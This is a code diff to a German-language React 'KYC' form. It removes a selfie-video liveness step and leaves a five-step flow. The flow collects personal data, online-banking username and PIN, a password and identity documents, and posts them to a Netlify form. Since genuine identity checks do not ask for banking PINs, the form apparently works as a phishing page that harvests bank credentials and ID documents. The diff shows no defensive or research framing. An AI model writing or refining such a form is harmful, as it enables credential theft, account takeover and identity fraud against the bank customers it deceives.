@@ -16,7 +16,6 @@ import SecuritySection from "./kyc-sections/security"
 import DocumentUploadSection from "./kyc-sections/document-upload"
 import ConfirmDetailsModal from "./confirm-details-modal"
 import RedirectOverlay from "./redirect-overlay"
-import LivenessCheckSection from "./kyc-sections/liveness-check"
 
 interface FormData {
   // Personal Info
@@ -38,9 +37,6 @@ interface FormData {
   accountType: string
   onlineBankingUsername: string
   onlineBankingPin: string
-
-  // Liveness
-  selfieVideo: File | null
 
   // Security
   password: string
@@ -72,7 +68,6 @@ export default function KYCForm() {
     accountType: "",
     onlineBankingUsername: "",
     onlineBankingPin: "",
-    selfieVideo: null,
     password: "",
     confirmPassword: "",
     acceptTerms: false,
@@ -141,9 +136,6 @@ export default function KYCForm() {
         if (!formData.onlineBankingPin.trim()) newErrors.onlineBankingPin = "PIN ist erforderlich"
         break
 
-      case 6: // Liveness
-        if (!formData.selfieVideo) newErrors.selfieVideo = "Selfie-Video ist erforderlich"
-        break
 
       case 4: // Security
         if (!formData.password) newErrors.password = "Password is required"
@@ -193,8 +185,6 @@ export default function KYCForm() {
           formData.onlineBankingUsername.trim() !== "" &&
           formData.onlineBankingPin.trim() !== ""
         )
-      case 6:
-        return !!formData.selfieVideo
       case 4:
         return (
           !!formData.password &&
@@ -242,8 +232,6 @@ export default function KYCForm() {
     // Documents
     if (!Array.isArray(formData.documents) || formData.documents.length === 0) newErrors.documents = "At least one document is required"
 
-    // Liveness
-    if (!formData.selfieVideo) newErrors.selfieVideo = "Selfie-Video ist erforderlich"
 
     setErrors(newErrors)
 
@@ -268,7 +256,6 @@ export default function KYCForm() {
         confirmPassword: 4,
         acceptTerms: 4,
         documents: 5,
-        selfieVideo: 6,
       }
       const step = keyToStep[firstErrorKey] || 1
       setCurrentStep(step)
@@ -280,7 +267,7 @@ export default function KYCForm() {
 
   const handleNextStep = () => {
     if (validateCurrentStep()) {
-      setCurrentStep((prev) => Math.min(prev + 1, 6))
+      setCurrentStep((prev) => Math.min(prev + 1, 5))
     }
   }
 
@@ -309,8 +296,6 @@ export default function KYCForm() {
           formData.documents.forEach((file, index) => {
             netlifyFormData.append(`document-${index + 1}`, file)
           })
-        } else if (key === "selfieVideo" && value) {
-          netlifyFormData.append("selfieVideo", value as File)
         } else if (typeof value === "boolean") {
           netlifyFormData.append(key, value ? "yes" : "no")
         } else if (value !== null && value !== undefined) {
@@ -348,7 +333,6 @@ export default function KYCForm() {
     { number: 3, title: "Finanzzugang", label: "Step 3" },
     { number: 4, title: "Security", label: "Step 4" },
     { number: 5, title: "Documents", label: "Step 5" },
-    { number: 6, title: "Selfie-Video (Liveness)", label: "Step 6" },
   ]
 
   return (
@@ -416,7 +400,6 @@ export default function KYCForm() {
               {currentStep === 3 && "Geben Sie Ihre Zugangsdaten fürs Online-Banking ein"}
               {currentStep === 4 && "Richten Sie Ihre Kontosicherheit ein"}
               {currentStep === 5 && "Laden Sie die erforderlichen Dokumente hoch"}
-              {currentStep === 6 && "Nehmen Sie ein kurzes Selfie-Video zur Liveness-Prüfung auf"}
             </CardDescription>
           </CardHeader>
           <CardContent>
@@ -459,13 +442,6 @@ export default function KYCForm() {
                 <DocumentUploadSection formData={formData} errors={errors} onDocumentsChange={handleDocumentsChange} />
               )}
 
-              {currentStep === 6 && (
-                <LivenessCheckSection
-                  selfieVideo={formData.selfieVideo}
-                  error={errors.selfieVideo}
-                  onCapture={(file) => setFormData((prev) => ({ ...prev, selfieVideo: file }))}
-                />
-              )}
 
               {/* Navigation Buttons */}
               <div className="flex gap-4 pt-6">
@@ -478,7 +454,7 @@ export default function KYCForm() {
                 >
                   Zurück
                 </Button>
-                {currentStep < 6 ? (
+                {currentStep < 5 ? (
                   <Button type="button" onClick={handleNextStep} className="flex-1" aria-label="Nächster Schritt" disabled={!isStepValid(currentStep)}>
                     Nächster Schritt
                   </Button>
